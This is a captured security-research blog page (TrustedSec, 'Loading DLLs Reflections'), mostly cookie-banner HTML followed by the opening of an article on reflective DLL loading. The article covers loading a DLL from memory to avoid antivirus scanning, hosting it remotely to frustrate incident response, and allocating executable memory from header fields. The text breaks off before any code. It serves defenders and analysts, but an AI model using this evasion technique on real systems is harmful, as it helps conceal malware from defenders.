# https://trustedsec.com/blog/loading-dlls-reflections

<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
  <body class="mx-auto lang-en section-blog type-blog antialiased overscroll-none"><div class="cky-hide cky-overlay"></div><div class="cky-btn-revisit-wrapper cky-revisit-hide cky-revisit-bottom-left" data-cky-tag="revisit-consent" data-tooltip="Consent Preferences" style="background-color: #000000;"><button aria-label="Consent Preferences" class="cky-btn-revisit"><img alt="Revisit consent button" src="https://cdn-cookieyes.com/assets/images/revisit.svg"></button></div><div class="cky-consent-container cky-box-bottom-left" aria-label="We value your privacy" role="region" tabindex="0"><div class="cky-consent-bar" data-cky-tag="notice" style="border-color: #EDF1F4; background-color: #EDF1F4;"><div class="cky-notice"><p class="cky-title" aria-level="1" data-cky-tag="title" role="heading" style="color: #212121;">We value your privacy</p><div class="cky-notice-group"><div class="cky-notice-des" data-cky-tag="description" style="color: #212121;"><p>We use cookies to enhance your browsing experience, serve personalised ads or content, and analyse our traffic. By clicking "Accept All", you consent to our use of cookies.</p></div><div class="cky-notice-btn-wrapper" data-cky-tag="notice-buttons"><button class="cky-btn cky-btn-customize" aria-label="Customise" data-cky-tag="settings-button" style="color: #000000; border-color: #000000; background-color: #EDF1F4;">Customise</button> <button class="cky-btn cky-btn-reject" aria-label="Reject All" data-cky-tag="reject-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Reject All</button> <button class="cky-btn cky-btn-accept" aria-label="Accept All" data-cky-tag="accept-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Accept All</button> </div></div></div></div></div><div class="cky-modal" tabindex="0"><div class="cky-preference-center" data-cky-tag="detail" aria-label="Customise Consent Preferences" aria-modal="true" role="dialog" style="color: #212121; border-color: #EDF1F4; background-color: #EDF1F4;"><div class="cky-preference-header"><span class="cky-preference-title" aria-level="1" data-cky-tag="detail-title" role="heading" style="color: #212121;">Customise Consent Preferences</span> <button aria-label="Close" class="cky-btn-close" data-cky-tag="detail-close"><img alt="Close" src="https://cdn-cookieyes.com/assets/images/close.svg" width="10" height="10"></button></div><div class="cky-preference-body-wrapper"><div class="cky-preference-content-wrapper" data-cky-tag="detail-description" style="color: #212121;"><p>We use cookies to help you navigate efficiently and perform certain functions. You will find detailed information about all cookies under each consent category below.</p><p>The cookies that are categorised as "Necessary" are stored on your browser as they are essential for enabling the basic functionalities of the site. ...&nbsp;<button class="cky-show-desc-btn" data-cky-tag="show-desc-button" aria-label="Show more">Show more</button></p></div><div class="cky-horizontal-separator"></div><div class="cky-accordion-wrapper" data-cky-tag="detail-categories"><div class="cky-accordion" id="ckyDetailCategorynecessary"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategorynecessaryBody" aria-label="Necessary" data-cky-tag="detail-category-title" style="color: #212121;">Necessary</button><span class="cky-always-active" data-cky-tag="always-active">Always Active</span></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Necessary cookies are required to enable the basic features of this site, such as providing secure log-in or adjusting your consent preferences. These cookies do not store any personally identifiable data.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategorynecessaryBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__cf_bm</div></li><li><div>Duration</div><div>1 hour</div></li><li><div>Description</div><div>This cookie, set by Cloudflare, is used to support Cloudflare Bot Management. </div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hssrc</div></li><li><div>Duration</div><div>session</div></li><li><div>Description</div><div>This cookie is set by Hubspot whenever it changes the session cookie. The __hssrc cookie set to 1 indicates that the user has restarted the browser, and if the cookie does not exist, it is assumed to be a new session.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hssc</div></li><li><div>Duration</div><div>1 hour</div></li><li><div>Description</div><div>HubSpot sets this cookie to keep track of sessions and to determine if HubSpot should increment the session number and timestamps in the __hstc cookie.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_cfuvid</div></li><li><div>Duration</div><div>session</div></li><li><div>Description</div><div>Calendly sets this cookie to track users across sessions to optimize user experience by maintaining session consistency and providing personalized services</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryfunctional"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryfunctionalBody" aria-label="Functional" data-cky-tag="detail-category-title" style="color: #212121;">Functional</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchfunctional" aria-label="Enable Functional" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Functional cookies help perform certain functionalities like sharing the content of the website on social media platforms, collecting feedback, and other third-party features.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryfunctionalBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>lidc</div></li><li><div>Duration</div><div>1 day</div></li><li><div>Description</div><div>LinkedIn sets the lidc cookie to facilitate data center selection.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>li_gc</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>Linkedin set this cookie for storing visitor's consent regarding using cookies for non-essential purposes.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryanalytics"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryanalyticsBody" aria-label="Analytics" data-cky-tag="detail-category-title" style="color: #212121;">Analytics</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchanalytics" aria-label="Enable Analytics" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics such as the number of visitors, bounce rate, traffic source, etc.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryanalyticsBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_gcl_au</div></li><li><div>Duration</div><div>3 months</div></li><li><div>Description</div><div>Google Tag Manager sets the cookie to experiment advertisement efficiency of websites using their services.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_ga_*</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Google Analytics sets this cookie to store and count page views.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_ga</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Google Analytics sets this cookie to calculate visitor, session and campaign data and track site usage for the site's analytics report. The cookie stores information anonymously and assigns a randomly generated number to recognise unique visitors.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hstc</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>Hubspot set this main cookie for tracking visitors. It contains the domain, initial timestamp (first visit), last timestamp (last visit), current timestamp (this visit), and session number (increments for each subsequent session).</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>hubspotutk</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>HubSpot sets this cookie to keep track of the visitors to the website. This cookie is passed to HubSpot on form submission and used when deduplicating contacts.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryperformance"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryperformanceBody" aria-label="Performance" data-cky-tag="detail-category-title" style="color: #212121;">Performance</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchperformance" aria-label="Enable Performance" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Performance cookies are used to understand and analyse the key performance indexes of the website which helps in delivering a better user experience for the visitors.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryperformanceBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>session_id</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>This cookie is used to get or set the session id for the current session.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryadvertisement"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryadvertisementBody" aria-label="Advertisement" data-cky-tag="detail-category-title" style="color: #212121;">Advertisement</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchadvertisement" aria-label="Enable Advertisement" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Advertisement cookies are used to provide visitors with customised advertisements based on the pages you visited previously and to analyse the effectiveness of the ad campaigns.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryadvertisementBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>StackAdapt sets this cookie as a third party advertising cookie to record information about a user's website activity, such as the pages visited and the locations viewed, to enable us to provide users with interest-based content and personalised advertisements on external websites.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id-v2</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>StackAdapt sets this cookie as a third party advertising cookie to record information about a user's website activity, such as the pages visited and the locations viewed, to enable us to provide users with interest-based content and personalised advertisements on external websites.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>bcookie</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>LinkedIn sets this cookie from LinkedIn share buttons and ad tags to recognize browser IDs.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>IDE</div></li><li><div>Duration</div><div>1 year 24 days</div></li><li><div>Description</div><div>Google DoubleClick IDE cookies store information about how the user uses the website to present them with relevant ads according to the user profile.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>test_cookie</div></li><li><div>Duration</div><div>15 minutes</div></li><li><div>Description</div><div>doubleclick.net sets this cookie to determine if the user's browser supports cookies.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryother"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryotherBody" aria-label="Uncategorised" data-cky-tag="detail-category-title" style="color: #212121;">Uncategorised</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchother" aria-label="Enable Uncategorised" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Other uncategorised cookies are those that are being analysed and have not been classified into a category as yet.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryotherBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id-v3</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_nearest_tld</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_referrer</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>This is a functionality cookie set by the CallRail. This cookie is used to store the referring URL. It helps to accurately attribute the visitor source when displaying a tracking phone number.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_landing</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>This is a functionality cookie set by the CallRail. This cookie is used to store the landing page URL. It helps to accurately attribute the visitor source when displaying a tracking phone number.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>frontend_lang</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>No description available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>libsyn-paywall-s</div></li><li><div>Duration</div><div>1 day</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul></div></div></div></div></div><div class="cky-footer-wrapper"><span class="cky-footer-shadow" style="background: linear-gradient(180deg, rgba(255, 255, 255, 0) 0%, #EDF1F4 100%);"></span><div class="cky-prefrence-btn-wrapper" data-cky-tag="detail-buttons"><button aria-label="Reject All" class="cky-btn cky-btn-reject" data-cky-tag="detail-reject-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Reject All</button> <button aria-label="Save My Preferences" class="cky-btn cky-btn-preferences" data-cky-tag="detail-save-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Save My Preferences</button> <button aria-label="Accept All" class="cky-btn cky-btn-accept" data-cky-tag="detail-accept-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Accept All</button></div><div data-cky-tag="detail-powered-by" style="padding: 8px 24px; font-size: 12px; font-weight: 400; line-height: 20px; text-align: right; border-radius: 0 0 6px 6px; direction: ltr; display: flex; justify-content: flex-end; align-items: center; color: #293C5B; background-color: #EDEDED;">Powered by <a href="https://www.cookieyes.com/product/cookie-consent/?ref=cypbcyb&amp;utm_source=cookie-banner&amp;utm_medium=powered-by-cookieyes" rel="noopener" style="margin-left:5px;line-height:0" target="_blank"><img alt="Cookieyes logo" src="https://cdn-cookieyes.com/assets/images/poweredbtcky.svg" style="width:78px;height:13px;margin:0" width="78" height="13"></a></div></div></div></div>


	

    

<!-- Global Header -->

<!-- End Global Header -->
		<main id="main" class="main overflow-x-hidden">

			

   



<section class="c-page-header relative bg-code text-white">

    <div class="px-p24 mq768:px-p48 mq1024:px-p56 c-header-wrap v-blog-header">
    <div class="max-w-p1440 mx-auto">
      <div class="flex flex-col mq768:flex-row">
        <div class="flex relative z-20 items-center mq768:w-1/2 order-1 py-p48 mq1024:py-p56 mq768:pr-p64 mq1024:pr-p56">

          <div class="w-full">

            

  
<ul class="mb-p64 mq1024:mb-p80 flex flex-wrap text-white">
                <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog">Blog</a></li>
            <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog/loading-dlls-reflections">Loading DLLs Reflections</a></li>
     </ul>
                        <div class="mb-p32">

                              <div class="mb-p16">
                  <span class="font-mono text-sm">April 25, 2024</span>
                </div>
              
                                                                <h1 class="text-h1 mq1280:text-title-xl">Loading DLLs Reflections</h1>
                              
                                        </div>

                          <div class="mb-p16">
                <span class="text-h3 inline-block">
                  Written by
                                                            Scott Nusbaum
                                                      </span>
              </div>
            


            
            
            
            <div class="mt-p64">
                              <span class="c-tag inline-block py-p6 px-p4 border border-gibson rounded-p6 text-gibson text-bd mr-p12 mb-p12 whitespace-nowrap">Malware Analysis</span>
                          </div>
          </div>
        </div>

        <div class="mq768:flex overflow-hidden items-center mq768:justify-end mq768:w-paired-img max-w-p1080 -mx-p24 mq768:mx-none order-2 mq768:absolute inset-y-0 left-paired-img-plus fx" x-data="" x-fx.left.1200="2rem" style="transform: translate3d(-2rem, 0px, 0px); transition-duration: 1.2s;">
          <div class="relative mq768:static mq768:w-full h-full pt-full -mx-p24 mq768:mx-none">
                          <picture class=" w-full"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767064415&amp;s=e6e069829ea2a63a24a0fc2d1395cb39, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767064415&amp;s=da79827456b4e8871ebfc76fbe7511fe 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767064415&amp;s=6e1d3963fe2930455b24631ec9c186d5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767064415&amp;s=581cc4812ae0b125fc641922f609a8a1 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767064415&amp;s=f5d09f029e81f16fa823d6d3459c1aa4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767064415&amp;s=056b1b1c288e5d2d7a5db9752c175910 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767064415&amp;s=bb273731a21107163bf01fcd3d9f6d98, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767064415&amp;s=4c8b5b0c882071c0b165ea4f2572ddab 1.5x"><img class="c-img opacity-0 transition-all duration-300 absolute inset-0 object-cover w-full h-full object-center" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/LoadingDLLsReflections_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767064415&amp;s=bb273731a21107163bf01fcd3d9f6d98" loading="eager" x-data="image({mq1024:{width:600,height:600},DEFAULT:{width:320,height:320}})" :width="getSize()" :height="getSize('height')" alt="" width="600" height="600" style="opacity: 1;"></picture>                      </div>
        </div>
      </div>
    </div>
  </div>

</section>


      
			
						<div class="relative"><section id="contentWell-0" class="c-module relative bg-white text-black py-p64 mq768:py-p96" data-module-num="1" style="z-index: 0;"><div class="px-p24 mq768:px-p48 mq1024:px-p56"><div class="max-w-p1440 mx-auto"><div class="flex flex-col mq1024:flex-row" x-data="{ mobile: ! $breakpoint('mq1024') }" @resize.window="mobile = ! $breakpoint('mq1024')"><div class="mq1024:w-p320 mq1024:pr-p64 grow-0 shrink-0 mq1024:order-1"><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/loading-dlls-reflections" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Loading%20DLLs%20Reflections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Loading%20DLLs%20Reflections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/loading-dlls-reflections" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Loading%20DLLs%20Reflections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Loading%20DLLs%20Reflections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div><div class="w-full mq1024:w-content-well mq1024:order-2 flex-1"><div class="c-content"><p class="MsoNormal">We're back with another post about common malware techniques. This time we're not talking about process hollowing. We are going to branch off and talk about the reflective loading of a DLL. This is a technique used to load a DLL into the memory of a process without having that DLL written disk. A similar technique is used to load <a href="https://trustedsec.com/research/coffloader">Beacon Object Files (BOF) or Common Object File Format (COFF)</a> in memory. The goal of this technique is to mimic the Windows API’s LoadLibrary function. LoadLibrary will load the DLL into the process memory space but requires that the DLL be stored someplace on the target systems disk. A benefit to not writing the DLL to disk is that it won’t be scanned by basic Anti-virus products. Another benefit is that it makes things harder for Incident Responders to identify what the contents of the DLL are.&nbsp;&nbsp;</p><p class="MsoNormal">In this blog, we will only discuss reflective loading into the current process; however, it wouldn’t be that difficult to make modifications to allow the loading of the DLL into a remote process. In the real world, this could be used as another method to hide the malicious code by downloading the DLL with one process, then injecting it into another process, and then loading it into that process. If this is something you would like us to write a blog about, let us know on <a href="https://x.com/_snus">X/Twitter</a>!</p><p class="MsoNormal">We will demonstrate this method in C and C# like we have in previous posts.</p><h2>1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; How Does it Work?</h2><p class="MsoNormal">The main benefit of using a reflective loader is that the malicious DLL is never written to disk. So, we need to find a way to transfer the DLL to the program. This can be done in multiple ways including packaging in the program itself or downloading from an external site. The drawback to packaging the DLL internal to the program is that a Reverse Engineer can easily carve it out of the static binary. One of the alternatives would be to host it on an external website. This allows flexibility to change out the DLL when a different set of functionalities are needed and as seen frequently during Incident Response (IR) cases the DLL can be removed altogether from the site. Removing the DLL from the site makes IR more difficult, if not impossible, because the only way to obtain the DLL would be to dump running memory. In most cases, the program isn’t still running.</p><p class="MsoNormal">Now that we have access to the DLL in memory let’s begin making it runnable. To execute the contents of the DLL we need to allocate memory space with permissions to execute. Again, there are multiple approaches to setting up this new memory as not all sections need to have the same permissions, read, write, or execute. For the sake of simplicity, we are allocating a large chunk of memory in the size requested by the DLL at the location requested by the DLL. When I say requested by the DLL, I mean that the DLLs Optional Header holds two fields that have the size of the DLL and the preferred memory location.&nbsp; The OptionalHeader contains the SizeOfImage and the ImageBase fields.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367410&amp;s=e94da9c19194d296d5260c8d8b884718, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=741&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367410&amp;s=0c67d8aa64788718c1d0f10fa68b0249 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=ad5fb80a15589a23933992c5edf6a55b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=741&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=d289da94791a4003dd3320567a933acf 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367410&amp;s=bf3d6d7481f879856bde89306dfb18e8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=741&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367410&amp;s=0c67d8aa64788718c1d0f10fa68b0249 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=be49f07e7d9aa52d867f0fefc0e05a7c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=741&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=d289da94791a4003dd3320567a933acf 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367410&amp;s=440af964bcfbbbe7257f6966bd84a1df, 